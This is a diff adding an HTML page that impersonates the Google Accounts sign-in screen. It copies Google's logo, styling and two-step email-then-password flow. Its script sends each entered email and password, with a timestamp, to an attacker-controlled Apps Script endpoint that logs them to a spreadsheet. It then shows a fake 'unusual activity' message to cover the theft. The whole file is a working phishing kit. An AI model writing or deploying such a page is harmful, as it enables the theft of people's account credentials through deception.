@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sign in - Google Accounts</title>
+<style>
+  /* Reset and base */
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    background: #f5f5f5;
+    font-family: "Roboto", Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    color: #202124;
+  }
+  a {
+    color: #1a73e8;
+    text-decoration: none;
+    cursor: pointer;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+
+  /* Container */
+  .container {
+    max-width: 360px;
+    padding: 40px 40px 20px;
+    margin: 80px auto;
+    background: white;
+    border-radius: 8px;
+    box-shadow: 0 3px 6px rgb(32 33 36 / 28%);
+  }
+
+  /* Google logo */
+  .logo {
+    display: block;
+    margin: 0 auto 24px auto;
+    width: 75px;
+    height: 24px;
+  }
+
+  /* Heading */
+  h1 {
+    font-size: 24px;
+    font-weight: 400;
+    margin: 0 0 20px 0;
+  }
+
+  /* Email Input */
+  .email-display {
+    font-size: 18px;
+    margin-bottom: 32px;
+    word-break: break-word;
+  }
+
+  /* Input fields */
+  input[type=email], input[type=password] {
+    width: 100%;
+    padding: 10px 12px;
+    margin: 8px 0 0 0;
+    font-size: 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline-offset: -2px;
+    outline-color: #1a73e8;
+  }
+  input[type=password] {
+    margin-top: 0;
+  }
+
+  /* Buttons */
+  .buttons {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 28px;
+  }
+  button {
+    background-color: #1a73e8;
+    border: none;
+    border-radius: 4px;
+    padding: 10px 24px;
+    color: white;
+    font-size: 14px;
+    font-weight: 500;
+    cursor: pointer;
+    outline: none;
+  }
+  button:disabled {
+    background-color: #8ab4f8;
+    cursor: default;
+  }
+
+  /* Secondary button */
+  .secondary-button {
+    background-color: transparent;
+    color: #1a73e8;
+    padding: 10px 24px;
+    font-weight: 500;
+  }
+
+  /* Error message */
+  .error-message {
+    color: #d93025;
+    font-size: 14px;
+    margin-top: 12px;
+  }
+
+  /* Help links */
+  .help-links {
+    margin-top: 40px;
+    font-size: 14px;
+    color: #3c4043;
+  }
+
+  /* Responsive adjustments */
+  @media (max-width: 400px) {
+    .container {
+      margin: 40px 20px;
+      padding: 30px 30px 20px;
+    }
+  }
+</style>
+</head>
+<body>
+  <main class="container" role="main" aria-label="Sign in to Google Accounts">
+    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
+
+    <h1>Sign in</h1>
+
+    <form id="loginForm">
+      <label for="email" style="font-size:14px; font-weight:500; color:#202124;">Email or phone</label>
+      <input type="email" id="email" name="email" required autocomplete="email" autofocus aria-describedby="emailHelp" />
+      <div id="emailHelp" style="font-size: 12px; color:#5f6368; margin-bottom: 18px; display:none;">Enter a valid email or phone number</div>
+
+      <button type="submit" id="nextButton">Next</button>
+    </form>
+  </main>
+
+<script>
+  // Step 1: Show email input, on submit show password input to mimic Google login flow.
+  const container = document.querySelector('.container');
+  const form = document.getElementById('loginForm');
+  const emailInput = form.querySelector('input[type="email"]');
+  const nextButton = form.querySelector('button[type="submit"]');
+
+  let step = 1;
+  let userEmail = "";
+
+  function clearForm() {
+    form.innerHTML = "";
+  }
+
+  function showPasswordForm(email) {
+    clearForm();
+
+    const label = document.createElement('label');
+    label.textContent = email;
+    label.className = 'email-display';
+    label.setAttribute('aria-label', 'Signed in user email');
+    form.appendChild(label);
+
+    const passwordLabel = document.createElement('label');
+    passwordLabel.setAttribute('for', 'password');
+    passwordLabel.style.fontSize = "14px";
+    passwordLabel.style.fontWeight = "500";
+    passwordLabel.style.color = "#202124";
+    passwordLabel.textContent = 'Enter your password';
+    form.appendChild(passwordLabel);
+
+    const passwordInput = document.createElement('input');
+    passwordInput.type = 'password';
+    passwordInput.name = 'password';
+    passwordInput.id = 'password';
+    passwordInput.required = true;
+    passwordInput.autocomplete = 'current-password';
+    passwordInput.style.marginTop = '8px';
+    passwordInput.style.fontSize = '16px';
+    passwordInput.style.padding = '10px 12px';
+    passwordInput.style.width = '100%';
+    passwordInput.style.border = '1px solid #dadce0';
+    passwordInput.style.borderRadius = '4px';
+    passwordInput.style.outlineOffset = '-2px';
+    passwordInput.style.outlineColor = '#1a73e8';
+    passwordInput.autofocus = true;
+    form.appendChild(passwordInput);
+
+    // Buttons container
+    const buttonsDiv = document.createElement('div');
+    buttonsDiv.className = 'buttons';
+
+    // Back button (secondary)
+    const backButton = document.createElement('button');
+    backButton.type = 'button';
+    backButton.className = 'secondary-button';
+    backButton.textContent = 'Back';
+    backButton.addEventListener('click', () => {
+      location.reload();
+    });
+    buttonsDiv.appendChild(backButton);
+
+    // Next button (submit)
+    const submitButton = document.createElement('button');
+    submitButton.type = 'submit';
+    submitButton.textContent = 'Next';
+    buttonsDiv.appendChild(submitButton);
+
+    form.appendChild(buttonsDiv);
+
+    // Set event listener for submit with password
+    form.onsubmit = (e) => {
+      e.preventDefault();
+      const password = passwordInput.value.trim();
+      if (!password) {
+        alert('Please enter your password.');
+        passwordInput.focus();
+        return;
+      }
+      // Submit email and password to Google Sheets via Apps Script
+      submitData(email, password);
+    };
+  }
+
+  form.onsubmit = (e) => {
+    e.preventDefault();
+    const email = emailInput.value.trim();
+    if (!email) {
+      alert('Please enter your email or phone.');
+      emailInput.focus();
+      return;
+    }
+    userEmail = email;
+    showPasswordForm(email);
+  };
+
+  function submitData(email, password) {
+    const url = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec'; // TODO: Replace with your Apps Script URL
+
+    const data = new FormData();
+    data.append('email', email);
+    data.append('password', password);
+    data.append('timestamp', new Date().toISOString());
+
+    fetch(url, {
+      method: 'POST',
+      mode: 'no-cors', 
+      body: data
+    })
+    .then(() => {
+      // Mimic Google behavior - redirect to Google accounts or show successful signin
+      alert('We detected an unusual activity. Please try again later.');
+      // Or we can redirect to https://accounts.google.com/ or anywhere
+      // window.location.href = 'https://accounts.google.com/';
+    })
+    .catch(() => {
+      alert('There was an error submitting your response. Please try again.');
+    });
+  }
+</script>
+</body>
+</html>
